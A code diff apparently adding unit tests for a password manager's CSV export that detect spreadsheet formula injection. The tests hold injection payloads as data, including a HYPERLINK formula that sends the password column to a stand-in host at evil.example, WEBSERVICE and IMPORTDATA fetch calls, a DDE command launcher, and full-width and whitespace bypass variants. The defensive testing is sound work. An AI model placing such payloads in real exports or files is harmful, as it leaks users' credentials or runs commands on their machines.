@@ -96,3 +96,97 @@ describe('csv export', () => {
         });
     });
 });
+
+// Spreadsheets run a cell opening with =, +, - or @. The export deliberately
+// does not defuse those (a prefix would survive into the data and come back on
+// the next import), so the export dialog warns instead, and the value of that
+// warning depends entirely on it staying quiet for ordinary data
+describe('spreadsheet formula detection', () => {
+    it('flags a formula that can reach the password column', () => {
+        expect(ExportService.looksLikeFormula(
+            '=HYPERLINK("https://evil.example/?d="&D2,"Account details")'
+        )).toBe(true);
+    });
+
+    it('flags the other trigger characters and the sheets fetchers', () => {
+        expect(ExportService.looksLikeFormula('@SUM(A1:A9)')).toBe(true);
+        expect(ExportService.looksLikeFormula('+WEBSERVICE("http://evil.example")')).toBe(true);
+        expect(ExportService.looksLikeFormula('=IMPORTDATA("http://evil.example")')).toBe(true);
+        expect(ExportService.looksLikeFormula('-HYPERLINK("http://evil.example","x")')).toBe(true);
+    });
+
+    // Reaches out through a pipe rather than a call, so neither the function
+    // pattern nor a trigger alone would catch it
+    it('flags the legacy DDE process launcher', () => {
+        expect(ExportService.looksLikeFormula("=cmd|'/c calc'!A1")).toBe(true);
+    });
+
+    // Leading whitespace does make a spreadsheet read the cell as text, and a
+    // tab is OWASP's suggested mitigation, but OWASP warns it comes undone
+    // when Excel saves and reopens the file. So it is skipped, not trusted
+    it('sees through leading whitespace of every kind', () => {
+        for (const prefix of ['\t', ' ', '\r\n', '  \t ']) {
+            expect(ExportService.looksLikeFormula(
+                `${prefix}=HYPERLINK("http://e.example","x")`
+            )).toBe(true);
+        }
+    });
+
+    // The documented way past a check that only knows the ASCII characters
+    it('flags the full-width forms of the trigger characters', () => {
+        expect(ExportService.looksLikeFormula('＝HYPERLINK("http://e.example","x")')).toBe(true);
+        expect(ExportService.looksLikeFormula('＋WEBSERVICE("http://e.example")')).toBe(true);
+        expect(ExportService.looksLikeFormula('－HYPERLINK("http://e.example","x")')).toBe(true);
+        expect(ExportService.looksLikeFormula('＠SUM(A1:A9)')).toBe(true);
+        // and the full-width bracket, which would otherwise hide the call
+        expect(ExportService.looksLikeFormula('=HYPERLINK（"http://e.example"）')).toBe(true);
+    });
+
+    it('stays quiet for ordinary data that merely starts with a trigger', () => {
+        expect(ExportService.looksLikeFormula('-hunter2')).toBe(false);
+        expect(ExportService.looksLikeFormula('=== keys ===')).toBe(false);
+        expect(ExportService.looksLikeFormula('@octocat')).toBe(false);
+        expect(ExportService.looksLikeFormula('+1 (555) 0100')).toBe(false);
+        expect(ExportService.looksLikeFormula('=2+2')).toBe(false);
+        expect(ExportService.looksLikeFormula('')).toBe(false);
+    });
+
+    // Prose in a note routinely puts a bracket after a word; a real payload
+    // never puts a space before it
+    it('does not flag prose with a bracketed aside', () => {
+        expect(ExportService.looksLikeFormula('=Total (see below)')).toBe(false);
+    });
+
+    it('stays quiet for a value holding a call but no trigger', () => {
+        expect(ExportService.looksLikeFormula('SUM(A1)')).toBe(false);
+        expect(ExportService.looksLikeFormula('see HYPERLINK(x) for more')).toBe(false);
+    });
+
+    it('names the entry and column of every risky cell, and nothing otherwise', async () => {
+        const db = await makeDb();
+        const clean = ExportService.formulaRisks(ExportService.collectRows(db));
+        expect(clean).toEqual([]);
+
+        const root = db.getDefaultGroup();
+        const bad = db.createEntry(root);
+        bad.fields.set('Title', 'Payroll');
+        bad.fields.set('Notes', '=HYPERLINK("https://evil.example/?d="&D2,"details")');
+
+        const risks = ExportService.formulaRisks(ExportService.collectRows(db));
+        expect(risks).toEqual([{ title: 'Payroll', column: 'Notes' }]);
+    });
+
+    it('leaves the exported bytes untouched, warning being the whole response', async () => {
+        const db = await makeDb();
+        const payload = '=HYPERLINK("https://evil.example","x")';
+        const bad = db.createEntry(db.getDefaultGroup());
+        bad.fields.set('Title', 'Payroll');
+        bad.fields.set('Notes', payload);
+
+        // Quoted as any other field is, with no prefix added to defuse it:
+        // the trigger is still the first character inside the quotes
+        const csv = ExportService.toCsv(db);
+        expect(csv).toContain(`"${payload.replace(/"/g, '""')}"`);
+        expect(csv).not.toContain(`"'=`);
+    });
+});
